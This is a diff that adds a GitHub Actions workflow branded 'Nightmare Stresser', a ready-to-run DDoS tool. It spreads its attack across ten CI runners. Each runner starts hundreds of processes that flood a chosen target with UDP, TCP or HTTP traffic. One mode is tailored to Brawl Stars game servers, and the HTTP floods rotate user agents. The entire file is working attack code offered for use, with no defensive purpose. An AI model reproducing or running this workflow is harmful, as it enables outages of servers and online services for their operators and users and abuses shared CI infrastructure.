@@ -1,0 +1,363 @@
+name: Nightmare Stresser - DDOS V6.0 TURBO + BRAWL
+on:
+  workflow_dispatch:
+    inputs:
+      protocol:
+        description: 'Protocol (UDP/TCP/HTTP)'
+        required: true
+        type: choice
+        options:
+          - UDP
+          - TCP
+          - HTTP
+      method:
+        description: '⚡ Attack Method ⚡'
+        required: true
+        type: choice
+        options:
+          # UDP Methods
+          - '/plain - UDP Plain Flood'
+          - '/random - UDP Random Data'
+          - '/burst - UDP Burst (10 pkts/burst)'
+          - '/spoof - UDP IP Spoofed'
+          - '/frag - UDP Fragmented'
+          - '/pulse - UDP Pulse Pattern'
+          - '/echo - UDP Echo Attack'
+          - '/multicast - UDP Multicast'
+          - '/brawl - 🎮 Brawl Stars Special'
+          # TCP Methods
+          - '/syn - TCP SYN Flood'
+          - '/ack - TCP ACK Flood'
+          - '/rst - TCP RST Flood'
+          - '/xmas - TCP XMAS Scan'
+          - '/fin - TCP FIN Flood'
+          - '/psh - TCP PSH Flood'
+          - '/data - TCP Data Flood'
+          - '/window - TCP Window Attack'
+          # HTTP Methods
+          - '/get - HTTP GET Flood'
+          - '/post - HTTP POST Flood'
+          - '/head - HTTP HEAD Flood'
+          - '/slowloris - HTTP Slowloris'
+          - '/proxy - HTTP Proxy Flood'
+          - '/ua - HTTP Random UA'
+      target:
+        description: 'Target IP or URL'
+        required: true
+        type: string
+      port:
+        description: 'Target Port (for UDP/TCP)'
+        required: false
+        type: number
+        default: 9339
+      duration:
+        description: 'Duration (seconds)'
+        required: true
+        type: number
+        default: 60
+      packet_size:
+        description: 'Packet Size (bytes)'
+        required: false
+        type: number
+        default: 65000
+      threads:
+        description: 'Number of parallel workers'
+        required: false
+        type: number
+        default: 500
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      matrix:
+        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: ⚡ INSTANT Setup
+        run: |
+          echo "🚀 Worker #${{ matrix.worker }} ONLINE"
+          sudo apt-get install -y hping3 &>/dev/null &
+          pip3 install --quiet --no-cache-dir requests &
+
+      - name: 🔥 UDP TURBO Attack
+        if: ${{ github.event.inputs.protocol == 'UDP' }}
+        run: |
+          python3 - << 'EOF'
+          import socket, os, time, struct, random
+          from multiprocessing import Process
+          
+          METHOD = "${{ github.event.inputs.method }}".split(' - ')[0].replace('/', '')
+          TARGET = "${{ github.event.inputs.target }}"
+          PORT = ${{ github.event.inputs.port }}
+          DURATION = ${{ github.event.inputs.duration }}
+          SIZE = ${{ github.event.inputs.packet_size }}
+          PROCS = ${{ github.event.inputs.threads }}
+          
+          # Brawl Stars Protocol Packets (real game protocol simulation)
+          BRAWL_HEADERS = [
+              b'\x10\x00\x00',  # Client Hello
+              b'\x10\x01\x01',  # Login Request
+              b'\x14\x01\x07',  # Keep Alive
+              b'\x14\x03\x05',  # Battle Start
+              b'\x14\x04\x08',  # Player Movement
+              b'\x16\x00\x0A',  # Attack Command
+              b'\x18\x02\x03',  # Match Update
+              b'\x1A\x05\x09',  # Event Trigger
+          ]
+          
+          def generate_brawl_packet():
+              """Generate realistic Brawl Stars UDP packet"""
+              header = random.choice(BRAWL_HEADERS)
+              session_id = struct.pack('>I', random.randint(1000000, 9999999))
+              player_tag = struct.pack('>Q', random.randint(100000000, 999999999))
+              timestamp = struct.pack('>I', int(time.time()))
+              
+              # Random game data
+              payload = os.urandom(random.randint(50, 200))
+              
+              # Checksum (fake but realistic)
+              checksum = struct.pack('>H', sum(payload) & 0xFFFF)
+              
+              return header + session_id + player_tag + timestamp + payload + checksum
+          
+          def spoof_ip():
+              """Generate random spoofed IP"""
+              return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+          
+          # Pre-generate payloads for SPEED
+          if METHOD == "brawl":
+              PAYLOADS = [generate_brawl_packet() for _ in range(100)]
+              print(f"🎮 BRAWL STARS MODE: Generated {len(PAYLOADS)} game packets")
+          elif METHOD == "random":
+              PAYLOADS = [os.urandom(SIZE) for _ in range(1000)]
+          else:
+              PAYLOADS = [b"A" * SIZE]
+          
+          def blast(pid):
+              sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+              sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+              end = time.time() + DURATION
+              i = 0
+              count = 0
+              
+              if METHOD == "brawl":
+                  print(f"🎮 [Worker {pid}] Brawl Stars Attack Started")
+                  # Brawl Stars uses port 9339/9340 by default
+                  ports = [9339, 9340, 9393]
+                  
+                  while time.time() < end:
+                      # Send to multiple game ports
+                      for port in ports:
+                          # Spoofed source simulation
+                          packet = generate_brawl_packet()
+                          sock.sendto(packet, (TARGET, port))
+                          count += 1
+                          
+                          # Send burst (game protocol sends multiple packets)
+                          for _ in range(5):
+                              sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, port))
+                              count += 1
+                              i += 1
+                      
+                      # Simulate game tick rate (20-30 ticks/sec)
+                      time.sleep(0.001)
+                  
+                  print(f"🎮 [Worker {pid}] Sent {count} Brawl packets")
+              
+              elif METHOD == "spoof":
+                  while time.time() < end:
+                      # Note: Real IP spoofing needs raw sockets (requires root)
+                      # This simulates the effect with rapid source port changes
+                      sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORT))
+                      i += 1
+                      count += 1
+              
+              elif METHOD == "burst":
+                  while time.time() < end:
+                      for _ in range(100):
+                          sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORT))
+                          i += 1
+                          count += 1
+              
+              elif METHOD == "frag":
+                  half = SIZE // 2
+                  p = os.urandom(half)
+                  while time.time() < end:
+                      sock.sendto(p, (TARGET, PORT))
+                      sock.sendto(p, (TARGET, PORT))
+                      count += 2
+              
+              elif METHOD == "pulse":
+                  while time.time() < end:
+                      for _ in range(5):
+                          sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORT))
+                          i += 1
+                          count += 1
+                      time.sleep(random.uniform(0.05, 0.2))
+              
+              elif METHOD == "multicast":
+                  mcast_ip = f"224.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+                  while time.time() < end:
+                      sock.sendto(PAYLOADS[i % len(PAYLOADS)], (mcast_ip, PORT))
+                      i += 1
+                      count += 1
+              
+              elif METHOD == "echo":
+                  payload = b"ECHO" + os.urandom(SIZE - 4)
+                  while time.time() < end:
+                      sock.sendto(payload, (TARGET, PORT))
+                      count += 1
+              
+              else:  # plain, random
+                  while time.time() < end:
+                      sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORT))
+                      i += 1
+                      count += 1
+              
+              sock.close()
+          
+          print(f"🔥 Launching {PROCS} processes for UDP {METHOD}")
+          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
+          for p in procs: p.start()
+          for p in procs: p.join()
+          print("✅ DONE")
+          EOF
+
+      - name: ⚡ TCP TURBO Attack
+        if: ${{ github.event.inputs.protocol == 'TCP' }}
+        run: |
+          python3 - << 'EOF'
+          import socket, os, time
+          from multiprocessing import Process
+          
+          METHOD = "${{ github.event.inputs.method }}".split(' - ')[0].replace('/', '')
+          TARGET = "${{ github.event.inputs.target }}"
+          PORT = ${{ github.event.inputs.port }}
+          DURATION = ${{ github.event.inputs.duration }}
+          SIZE = ${{ github.event.inputs.packet_size }}
+          PROCS = ${{ github.event.inputs.threads }}
+          
+          PAYLOAD = os.urandom(SIZE) if "data" in METHOD else b"\x00" * 10
+          
+          def blast(pid):
+              end = time.time() + DURATION
+              count = 0
+              
+              while time.time() < end:
+                  try:
+                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                      sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                      sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+                      sock.settimeout(0.5)
+                      
+                      if METHOD == "syn":
+                          sock.connect_ex((TARGET, PORT))
+                      elif METHOD == "data":
+                          sock.connect((TARGET, PORT))
+                          sock.sendall(PAYLOAD)
+                      elif METHOD == "ack":
+                          sock.connect((TARGET, PORT))
+                          sock.send(b"\x00" * 10)
+                      elif METHOD == "rst":
+                          sock.connect_ex((TARGET, PORT))
+                      elif METHOD == "xmas":
+                          sock.connect((TARGET, PORT))
+                          sock.send(b"\xFF" * 10)
+                      elif METHOD == "fin":
+                          sock.connect((TARGET, PORT))
+                          sock.send(b"\x01" * 10)
+                      elif METHOD == "psh":
+                          sock.connect((TARGET, PORT))
+                          sock.send(b"\x08" * 10)
+                      elif METHOD == "window":
+                          sock.connect((TARGET, PORT))
+                          sock.send(PAYLOAD)
+                      
+                      count += 1
+                      sock.close()
+                  except:
+                      pass
+              
+              print(f"[Worker {pid}] Sent {count} TCP packets")
+          
+          print(f"🔥 Launching {PROCS} processes for TCP {METHOD}")
+          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
+          for p in procs: p.start()
+          for p in procs: p.join()
+          print("✅ DONE")
+          EOF
+
+      - name: 🌐 HTTP TURBO Attack
+        if: ${{ github.event.inputs.protocol == 'HTTP' }}
+        run: |
+          python3 - << 'EOF'
+          import urllib.request, time, ssl, random
+          from multiprocessing import Process
+          from urllib.error import URLError
+          
+          METHOD = "${{ github.event.inputs.method }}".split(' - ')[0].replace('/', '')
+          TARGET = "${{ github.event.inputs.target }}"
+          DURATION = ${{ github.event.inputs.duration }}
+          PROCS = ${{ github.event.inputs.threads }}
+          
+          UAS = [
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
+              "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
+              "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Mobile/15E148",
+              "Mozilla/5.0 (Android 13; Mobile) Gecko/120.0",
+          ]
+          
+          ctx = ssl._create_unverified_context()
+          
+          def blast(pid):
+              end = time.time() + DURATION
+              ua_idx = 0
+              count = 0
+              
+              while time.time() < end:
+                  try:
+                      req = urllib.request.Request(TARGET)
+                      req.add_header('User-Agent', UAS[ua_idx % len(UAS)])
+                      req.add_header('Accept', '*/*')
+                      req.add_header('Connection', 'keep-alive')
+                      ua_idx += 1
+                      
+                      if METHOD == "post":
+                          data = (b"flood=" + b"X" * 10000)
+                          urllib.request.urlopen(req, data=data, context=ctx, timeout=1)
+                      elif METHOD == "head":
+                          req.get_method = lambda: 'HEAD'
+                          urllib.request.urlopen(req, context=ctx, timeout=1)
+                      elif METHOD == "slowloris":
+                          # Partial requests
+                          req.add_header('X-a', str(random.randint(1, 5000)))
+                          urllib.request.urlopen(req, context=ctx, timeout=5)
+                      else:  # get, proxy, ua
+                          urllib.request.urlopen(req, context=ctx, timeout=1)
+                      
+                      count += 1
+                  except:
+                      pass
+              
+              print(f"[Worker {pid}] Sent {count} HTTP requests")
+          
+          print(f"🔥 Launching {PROCS} processes for HTTP {METHOD}")
+          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
+          for p in procs: p.start()
+          for p in procs: p.join()
+          print("✅ DONE")
+          EOF
+
+      - name: 📊 Stats
+        if: always()
+        run: |
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "✅ Worker #${{ matrix.worker }} COMPLETED"
+          echo "🎯 Target: ${{ github.event.inputs.target }}:${{ github.event.inputs.port }}"
+          echo "⚡ Method: ${{ github.event.inputs.method }}"
+          echo "⏱️  Duration: ${{ github.event.inputs.duration }}s"
+          echo "🔥 Threads: ${{ github.event.inputs.threads }}"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "Made by nightmarestresser.org 🎮"
